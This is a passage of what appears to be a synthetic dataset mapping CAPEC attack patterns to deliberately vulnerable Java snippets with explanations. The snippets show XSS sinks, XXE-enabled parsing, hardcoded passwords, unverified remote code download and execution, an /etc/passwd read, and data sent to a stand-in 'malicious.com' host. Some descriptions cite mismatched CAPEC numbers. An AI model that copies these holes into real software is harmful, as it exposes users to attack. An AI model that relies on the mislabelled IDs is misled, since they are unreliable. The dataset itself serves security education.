        "code_snippet": "import java.util.prefs.Preferences;\n\npublic class RegistryManipulation {\n    public static void main(String[] args) {\n        // Obtain a reference to the system node of the registry\n        Preferences systemRoot = Preferences.systemRoot();\n        \n        // Vulnerable code: Storing sensitive information in cleartext\n        String sensitiveKey = \"com.example.sensitive\";\n        String sensitiveValue = \"password123\";\n        systemRoot.put(sensitiveKey, sensitiveValue);\n        \n        // Vulnerable code: External control of system setting\n        String configKey = \"com.example.config\";\n        String configValue = \"defaultConfig\";\n        systemRoot.put(configKey, configValue);\n        \n        // Simulate an attacker modifying the registry value\n        String attackerValue = \"maliciousConfig\";\n        systemRoot.put(configKey, attackerValue);\n        \n        // Retrieve and print the modified value\n        String retrievedValue = systemRoot.get(configKey, \"defaultConfig\");\n        System.out.println(\"Retrieved Config Value: \" + retrievedValue);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an application stores sensitive information in the system registry in cleartext and allows external control of system settings. The Preferences API is used to interact with the registry. The code stores a sensitive value (e.g., a password) and a configuration value in the registry. It then simulates an attacker modifying the configuration value, which is subsequently retrieved and printed. This example highlights vulnerabilities such as cleartext storage of sensitive information (CWE-314) and external control of system settings (CWE-15), aligning with the CAPEC description of manipulating registry information to affect application behavior or hide malicious activity."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class SensitiveDataCache {\n    private Map<String, String> cache = new HashMap<>();\n\n    public void storeSensitiveData(String key, String value) {\n        // Storing sensitive data in cache without encryption\n        cache.put(key, value);\n    }\n\n    public String retrieveSensitiveData(String key) {\n        // Retrieving sensitive data from cache\n        return cache.get(key);\n    }\n\n    public static void main(String[] args) {\n        SensitiveDataCache sensitiveDataCache = new SensitiveDataCache();\n        sensitiveDataCache.storeSensitiveData(\"password\", \"mySecretPassword\");\n        System.out.println(\"Retrieved: \" + sensitiveDataCache.retrieveSensitiveData(\"password\"));\n    }\n}",
        "description": "This Java code snippet demonstrates a simple cache mechanism that stores and retrieves sensitive data without any encryption or protection. The `SensitiveDataCache` class uses a `HashMap` to store sensitive information such as passwords. The `storeSensitiveData` method adds sensitive data to the cache, and the `retrieveSensitiveData` method retrieves it. This code embodies the main idea of CAPEC- Lifting Sensitive Data Embedded in Cache, as it shows how sensitive information can be stored in a cache without proper protection, making it vulnerable to unauthorized access. The related CWEs highlight the issues of using a cache for sensitive data (CWE-524), missing encryption (CWE-311), and improper handling of sensitive information, which are all demonstrated in this example."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "public class VulnerableApp {\n    // Hardcoded credentials (CWE-522)\n    private static final String USERNAME = \"admin\";\n    private static final String PASSWORD = \"password123\";\n\n    public static void main(String[] args) {\n        // Simulate client-side authentication (CWE-603)\n        if (authenticate(USERNAME, PASSWORD)) {\n            System.out.println(\"Authentication successful!\");\n        } else {\n            System.out.println(\"Authentication failed!\");\n        }\n    }\n\n    // Client-side authentication method\n    private static boolean authenticate(String username, String password) {\n        // Insecure comparison (CWE-294)\n        return USERNAME.equals(username) && PASSWORD.equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that embodies the main idea of CAPEC-37: Retrieve Embedded Sensitive Data. The code includes hardcoded credentials (CWE-522), which are stored insecurely within the client-side code. The authentication process is performed on the client side (CWE-603), making it susceptible to bypass if the client code is modified. Additionally, the authentication method uses a simple comparison, which could be exploited through capture-replay attacks (CWE-294). This example highlights the risks of embedding sensitive data in client distributions and performing authentication on the client side."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "import java.security.*;\nimport java.nio.file.*;\n\npublic class MaliciousCodeSigner {\n    private static final String SIGNING_KEY = \"hardcoded-signing-key\"; // CWE-798\n\n    public static void main(String[] args) throws Exception {\n        // Load the malicious code (CWE-506)\n        byte[] maliciousCode = Files.readAllBytes(Paths.get(\"malicious_code.jar\"));\n\n        // Sign the malicious code (CAPEC: Signing Malicious Code)\n        byte[] signedCode = signCode(maliciousCode, SIGNING_KEY);\n\n        // Save the signed malicious code\n        Files.write(Paths.get(\"signed_malicious_code.jar\"), signedCode);\n    }\n\n    private static byte[] signCode(byte[] code, String key) throws NoSuchAlgorithmException, InvalidKeyException, SignatureException {\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair pair = keyGen.generateKeyPair();\n        PrivateKey privateKey = pair.getPrivate();\n\n        signature.initSign(privateKey);\n        signature.update(code);\n        return signature.sign();\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Signing Malicious Code' (CAPEC). The code includes a hard-coded signing key (CWE-798) and loads a malicious code file (CWE-506). It then signs the malicious code using a generated RSA key pair, simulating the process of an adversary using extracted credentials to sign malicious content. The signed malicious code is saved to a file, representing how an attacker could distribute malicious code that appears to be legitimately signed by a trusted developer."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableClient {\n    public static void main(String[] args) {\n        try {\n            // Downloading code without integrity check (CWE-494)\n            URL url = new URL(\"http://example.com/remoteCode.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"remoteCode.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // Loading and executing the downloaded code (CWE-829)\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"remoteCode.jar\");\n            Process p = pb.start();\n            p.waitFor();\n\n            // Client-side authentication (CWE-603)\n            if (authenticateClient(\"username\", \"password\")) {\n                System.out.println(\"Client authenticated.\");\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    // Client-side enforcement of server-side security (CWE-602)\n    private static boolean authenticateClient(String username, String password) {\n        // Insecure: Authentication logic on the client side\n        return \"username\".equals(username) && \"password\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the CAPEC 'Removing Important Client Functionality'. The code downloads and executes a remote JAR file without verifying its integrity (CWE-494 and CWE-829), which could allow an attacker to inject malicious code. Additionally, it performs client-side authentication (CWE-603) and relies on client-side enforcement of security mechanisms (CWE-602), making it possible for an attacker to bypass authentication by modifying the client. This represents the main idea of the CAPEC, where the server assumes the client functionality to be present and trustworthy, but an adversary can remove or disable it."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "public class ShoppingCart {\n    private double totalCost = 0.0;\n\n    public void addItem(double price, int quantity) {\n        // Client-side calculation of total cost\n        totalCost += price * quantity;\n    }\n\n    public double getTotalCost() {\n        return totalCost;\n    }\n\n    public static void main(String[] args) {\n        ShoppingCart cart = new ShoppingCart();\n        cart.addItem(100.0, 2); // Adding 2 items each costing 100.0\n        System.out.println(\"Total Cost: \" + cart.getTotalCost());\n\n        // Attacker modifies the client-side logic\n        cart.totalCost = 50.0; // Manipulating the total cost directly\n        System.out.println(\"Manipulated Total Cost: \" + cart.getTotalCost());\n    }\n}",
        "description": "This Java code snippet represents a vulnerable shopping cart system where the total cost of items is calculated on the client side. The `addItem` method calculates the total cost based on the price and quantity of items added. However, the total cost is stored in a mutable field `totalCost`, which can be directly manipulated by an attacker. In the `main` method, after adding items to the cart, the attacker directly modifies the `totalCost` field to a lower value, demonstrating how the client-side logic can be tampered with to send incorrect information to the server. This embodies the CAPEC's main idea of removing or short-circuiting 'purse' logic, leading to incorrect billing. The related CWEs are illustrated by the reliance on client-side enforcement (CWE-602), incorrect calculation (CWE-682), and improper validation (CWE-1284)."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\n@WebServlet(\"/upload\")\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"fileName\");\n        String filePath = \"/uploads/\" + fileName;\n        String mimeType = Files.probeContentType(Paths.get(filePath));\n\n        // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n        if (mimeType == null || !mimeType.equals(\"text/plain\")) {\n            response.sendError(HttpServletResponse.SC_UNSUPPORTED_MEDIA_TYPE, \"Unsupported file type\");\n            return;\n        }\n\n        // Read file content\n        String fileContent = new String(Files.readAllBytes(Paths.get(filePath)));\n\n        // CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n        response.setContentType(\"text/html\");\n        response.getWriter().write(\"<html><body>\" + fileContent + \"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable file upload and display mechanism. The servlet accepts a file name as input, checks its MIME type, and then reads and displays the file content. The code is vulnerable to several issues: \n1. CWE-646: The MIME type check relies on the file extension, which can be manipulated by an attacker to bypass the check. \n2. CWE-79: The file content is directly included in the HTML response without proper sanitization, leading to potential Cross-site Scripting (XSS) attacks. \nThe main idea of the CAPEC is represented by the possibility of an attacker uploading a file with a misleading MIME type and injecting malicious scripts that are executed in the victim's browser."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<img src='\" + userInput + \"'>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to CWE-79 (Cross-site Scripting) and CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags). The servlet takes user input from a request parameter and directly inserts it into an HTML IMG tag without proper sanitization or neutralization. This can allow an attacker to inject malicious scripts via the 'input' parameter, leading to XSS attacks. The code represents the deprecated CAPEC idea of leveraging web tools to change application behavior, as an attacker could use tools like Firebug to manipulate the 'input' parameter and exploit the vulnerability."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class MisuseFunctionality {\n    public static void main(String[] args) {\n        try {\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            File sensitiveFile = new File(\"/etc/passwd\");\n            Scanner fileReader = new Scanner(sensitiveFile);\n            StringBuilder fileContent = new StringBuilder();\n            while (fileReader.hasNextLine()) {\n                fileContent.append(fileReader.nextLine()).append(\"\\n\");\n            }\n            fileReader.close();\n\n            // CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n            // Undocumented feature: writing sensitive data to a log file\n            File logFile = new File(\"log.txt\");\n            FileWriter logWriter = new FileWriter(logFile);\n            logWriter.write(fileContent.toString());\n            logWriter.close();\n\n            System.out.println(\"Sensitive data has been logged.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a misuse of functionality by leveraging legitimate capabilities of the application to achieve a negative technical impact. The code reads sensitive system information from the '/etc/passwd' file and writes it to a log file ('log.txt'). This represents CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by exposing sensitive data to an unauthorized control sphere. Additionally, it includes an undocumented feature (CWE-1242) by writing sensitive data to a log file, which could be exploited by an adversary. The code does not alter the system functionality but uses it in an unintended way, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "import java.io.*;\n\npublic class PathTraversalExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PathTraversalExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        String basePath = \"/var/www/html/\";\n        File file = new File(basePath + filename);\n\n        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a path traversal vulnerability. The program takes a filename as a command-line argument and attempts to read and print the contents of the file. The base path is set to '/var/www/html/', but the code does not properly sanitize the input filename. This allows an attacker to use sequences like '/../' to traverse directories and access files outside the intended directory. For example, an attacker could provide '../../etc/passwd' as the filename to read the system's password file. This code embodies the main idea of CAPEC-126 and related CWEs by showing how improper neutralization of path sequences can lead to directory traversal attacks."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        try {\n            // Direct use of sockets (CWE-246)\n            ServerSocket serverSocket = new ServerSocket(8080);\n            Socket clientSocket = serverSocket.accept();\n            // Simulate some processing\n            clientSocket.getOutputStream().write(\"Hello, World!\".getBytes());\n            clientSocket.close();\n            serverSocket.close();\n        } catch (Exception e) {\n            // Missing custom error page (CWE-7)\n            response.getWriter().write(\"Error: \" + e.getMessage());\n            e.printStackTrace(); // Information exposure through debug log files (CWE-532)\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable servlet that embodies the main idea of the deprecated CAPEC for fuzzing to garner J2EE/.NET-based stack traces for application mapping. The code directly uses sockets (CWE-246), which is a bad practice in J2EE applications. It also lacks a custom error page (CWE-7), displaying sensitive error information directly to the user. Additionally, it exposes information through debug log files (CWE-532) by printing the stack trace. These vulnerabilities can be exploited by attackers to gain insights into the application's structure and behavior."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "import java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableApp {\n    private static final Logger logger = Logger.getLogger(VulnerableApp.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            FileHandler fh = new FileHandler(\"app.log\", true);\n            fh.setFormatter(new SimpleFormatter());\n            logger.addHandler(fh);\n\n            // Simulate receiving a message\n            String message = args.length > 0 ? args[0] : \"default\";\n            processMessage(message);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void processMessage(String message) {\n        try {\n            // Simulate processing the message\n            if (message.equals(\"crash\")) {\n                throw new RuntimeException(\"Simulated crash with sensitive info: DB_PASSWORD=secret\");\n            }\n            logger.info(\"Processed message: \" + message);\n        } catch (RuntimeException e) {\n            logger.severe(\"Error processing message: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that logs sensitive information when an error occurs. The application processes incoming messages and logs them. If a specific message ('crash') is received, it throws a RuntimeException containing sensitive information (e.g., a database password). The error message, including the sensitive information, is then logged. This example embodies the main idea of CAPEC-202 by showing how an attacker can send unexpected messages to trigger error conditions that expose sensitive information in logs, aligning with CWEs 209, 532, 211, 497, and 210."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            ServerSocket serverSocket = new ServerSocket(8080);\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                // No authentication or integrity checks\n                System.out.println(\"Received: \" + inputLine);\n                out.println(\"Echo: \" + inputLine);\n            }\n\n            in.close();\n            out.close();\n            clientSocket.close();\n            serverSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication channel where a server listens for incoming connections on port 8080. The server accepts connections and reads input from the client, echoing back the received messages. The code lacks authentication (CWE-306), does not verify the integrity of the messages (CWE-924), and does not verify the source of the communication (CWE-940). Additionally, it does not ensure that the communication channel is only accessible by the intended endpoints (CWE-300), and it could be susceptible to covert channels (CWE-514). This setup allows an adversary to manipulate the communication channel, potentially leading to information exposure or system compromise."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "import javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.SSLSocket;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.IOException;\n\npublic class VulnerableSSLClient {\n    public static void main(String[] args) {\n        String host = \"example.com\";\n        int port = 443;\n        try {\n            SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();\n            SSLSocket socket = (SSLSocket) factory.createSocket(host, port);\n            socket.startHandshake();\n\n            // Send sensitive data without proper verification\n            OutputStream out = socket.getOutputStream();\n            String sensitiveData = \"username=admin&password=admin123\";\n            out.write(sensitiveData.getBytes());\n            out.flush();\n\n            // Read response\n            InputStream in = socket.getInputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead = in.read(buffer);\n            System.out.println(\"Response: \" + new String(buffer, 0, bytesRead));\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable SSL/TLS client that connects to a server without properly verifying the server's identity. The client sends sensitive information (username and password) over the SSL/TLS connection. This embodies the main idea of CAPEC 'Exploiting Incorrectly Configured SSL/TLS' by showing how an adversary could exploit the lack of proper verification (CWE-940) and the transmission of sensitive data (CWE-201). The code also highlights the risk of improper restriction of communication channels (CWE-923) and potential for capture-replay attacks (CWE-294) due to the insecure configuration."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.ParserConfigurationException;\nimport javax.xml.transform.Transformer;\nimport javax.xml.transform.TransformerException;\nimport javax.xml.transform.TransformerFactory;\nimport javax.xml.transform.dom.DOMSource;\nimport javax.xml.transform.stream.StreamResult;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\nimport org.xml.sax.SAXException;\nimport java.io.File;\nimport java.io.IOException;\n\npublic class UDDISpoofingExample {\n    public static void main(String[] args) {\n        try {\n            // Load XML file without validation (CWE-112)\n            File inputFile = new File(\"input.xml\");\n            DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();\n            Document doc = dBuilder.parse(inputFile);\n            doc.getDocumentElement().normalize();\n\n            // Manipulate the XML content (CWE-924)\n            Element rootElement = doc.getDocumentElement();\n            rootElement.setAttribute(\"serviceProvider\", \"fakeServiceProvider\");\n\n            // Save the manipulated XML to a new file\n            TransformerFactory transformerFactory = TransformerFactory.newInstance();\n            Transformer transformer = transformerFactory.newTransformer();\n            DOMSource source = new DOMSource(doc);\n            StreamResult result = new StreamResult(new File(\"output.xml\"));\n            transformer.transform(source, result);\n\n            System.out.println(\"XML file manipulated and saved successfully.\");\n        } catch (ParserConfigurationException | SAXException | IOException | TransformerException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability related to the spoofing of UDDI/ebXML messages. The code reads an XML file without validating it against a schema (CWE-112), which could allow an attacker to inject malicious content. It then manipulates the XML content by changing the 'serviceProvider' attribute to a fake value (CWE-924), simulating an attack where an attacker impersonates a legitimate service provider. Finally, the manipulated XML is saved to a new file. This example highlights the risks of insufficient data authenticity verification and improper enforcement of message integrity during transmission."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.ParserConfigurationException;\nimport javax.xml.transform.Transformer;\nimport javax.xml.transform.TransformerException;\nimport javax.xml.transform.TransformerFactory;\nimport javax.xml.transform.dom.DOMSource;\nimport javax.xml.transform.stream.StreamResult;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\nimport org.xml.sax.SAXException;\nimport java.io.File;\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class XMLRoutingDetour {\n    public static void main(String[] args) {\n        try {\n            // Load XML file\n            File inputFile = new File(\"input.xml\");\n            DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();\n            Document doc = dBuilder.parse(inputFile);\n            doc.getDocumentElement().normalize();\n\n            // Extract routing information (potentially malicious)\n            String routingURL = doc.getElementsByTagName(\"routingURL\").item(0).getTextContent();\n\n            // Send XML to the routing URL (CWE-610)\n            URL url = new URL(routingURL);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setDoOutput(true);\n            conn.setRequestMethod(\"POST\");\n            TransformerFactory transformerFactory = TransformerFactory.newInstance();\n            Transformer transformer = transformerFactory.newTransformer();\n            DOMSource source = new DOMSource(doc);\n            StreamResult result = new StreamResult(conn.getOutputStream());\n            transformer.transform(source, result);\n\n            // Process response (CWE-441)\n            if (conn.getResponseCode() == 200) {\n                System.out.println(\"XML routed successfully.\");\n            } else {\n                System.out.println(\"Failed to route XML.\");\n            }\n        } catch (ParserConfigurationException | SAXException | IOException | TransformerException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential XML Routing Detour Attack. The code reads an XML file, extracts a routing URL from it, and sends the XML content to that URL. This embodies the main idea of CAPEC-94, where an attacker can manipulate the routing information within the XML to redirect the processing to a malicious endpoint. The code also highlights related CWEs: CWE-610 (Externally Controlled Reference to a Resource in Another Sphere) by using an externally controlled URL for routing, and CWE-441 (Unintended Proxy or Intermediary) by acting as an intermediary that forwards the XML content to an external actor. The code lacks proper validation and security checks, making it vulnerable to such attacks."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableClientServer {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(\"localhost\", 8080);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n        // Weak algorithm selection (CWE-757)\n        String algorithm = \"DES\"; // Not the strongest algorithm available\n        out.println(\"ALGO:\" + algorithm);\n\n        // Client-side enforcement of server-side security (CWE-602)\n        if (algorithm.equals(\"DES\")) {\n            System.out.println(\"Using DES encryption\");\n        }\n\n        // Sending sensitive data\n        out.println(\"AUTH:username:password\");\n\n        // Capture-replay vulnerability (CWE-294)\n        String response = in.readLine();\n        if (response.equals(\"REPLAY\")) {\n            out.println(\"AUTH:username:password\"); // Replay attack\n        }\n\n        // Incorrectly specified destination (CWE-941)\n        Socket wrongSocket = new Socket(\"malicious.com\", 8080);\n        PrintWriter wrongOut = new PrintWriter(wrongSocket.getOutputStream(), true);\n        wrongOut.println(\"Sensitive data\");\n\n        socket.close();\n        wrongSocket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable client-server communication scenario embodying the main idea of CAPEC-272: Client-Server Protocol Manipulation. The code includes several weaknesses:\n\n1. **Algorithm Downgrade (CWE-757)**: The client selects a less secure algorithm (DES) for encryption, which is not the strongest available.\n2. **Client-Side Enforcement of Server-Side Security (CWE-602)**: The client enforces the use of the DES algorithm, which should be a server-side responsibility.\n3. **Authentication Bypass by Capture-replay (CWE-294)**: The code allows for a replay attack by resending the same authentication message upon receiving a specific response.\n4. **Incorrectly Specified Destination (CWE-941)**: The client sends sensitive data to an incorrect destination (malicious.com) instead of the intended server.\n\nThese vulnerabilities illustrate how weaknesses in the client-server protocol can be exploited by an adversary to perform unexpected actions."
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.File;\n\npublic class XMLExternalEntityExample {\n    public static void main(String[] args) {\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n            dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", true);\n            dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", true);\n            dbf.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true);\n\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new File(\"malicious.xml\"));\n\n            System.out.println(\"Parsed XML successfully\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Data Serialization External Entities Blowup' (CAPEC). The code uses the DocumentBuilderFactory to parse an XML file without properly restricting external entity references. The features 'external-general-entities' and 'external-parameter-entities' are enabled, allowing the XML parser to process external entities. This can be exploited by an attacker to include a URI that consumes a large amount of resources, potentially leading to a denial of service (DoS) condition. The code also touches on CWE-611 (Improper Restriction of XML External Entity Reference) by not disabling external entity processing, CWE-99 (Improper Control of Resource Identifiers) by allowing external URIs, and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) by processing an externally supplied XML file without proper validation."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"userInput\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<iframe src='\" + userInput + \"' width='600' height='400'></iframe>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}\n",
        "description": "This Java servlet code demonstrates a vulnerable implementation that can be exploited in an iFrame overlay attack. The servlet takes user input from a request parameter and directly embeds it into an iframe's src attribute without proper validation or sanitization. This can lead to several security issues:\n\n1. **Improper Restriction of Rendered UI Layers or Frames (CWE-1021)**: The code does not restrict the iframe source, allowing potentially malicious content to be loaded from an untrusted domain.\n2. **Cross-site Scripting (CWE-79)**: The user input is not sanitized, making the application vulnerable to XSS attacks if the input contains malicious scripts.\n3. **User Interface (UI) Misrepresentation of Critical Information (CWE-451)**: The iframe can be used to misrepresent the UI, tricking users into interacting with a malicious interface that appears legitimate.\n\nThe main idea of the CAPEC is represented by the iframe overlay attack, where the user is tricked into interacting with a malicious interface embedded within a seemingly legitimate application."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class FingerprintingExample {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n\n            // Exposing sensitive information\n            String serverInfo = connection.getHeaderField(\"Server\");\n            System.out.println(\"Server Information: \" + serverInfo);\n\n            // Observable behavioral discrepancy\n            if (serverInfo != null && serverInfo.contains(\"Apache\")) {\n                System.out.println(\"The server is running Apache.\");\n            } else if (serverInfo != null && serverInfo.contains(\"nginx\")) {\n                System.out.println(\"The server is running Nginx.\");\n            } else {\n                System.out.println(\"Unknown server.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of fingerprinting a web server by making an HTTP GET request to a target URL and analyzing the 'Server' header in the HTTP response. The code exposes sensitive information (CWE-200) by printing the server type, which can be used by an adversary to identify the server software (e.g., Apache, Nginx). This information can then be used to discover specific weaknesses or vulnerabilities associated with that server software. Additionally, the code demonstrates an observable behavioral discrepancy (CWE-207) by behaving differently based on the server type, which can further aid an attacker in fingerprinting the target system."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
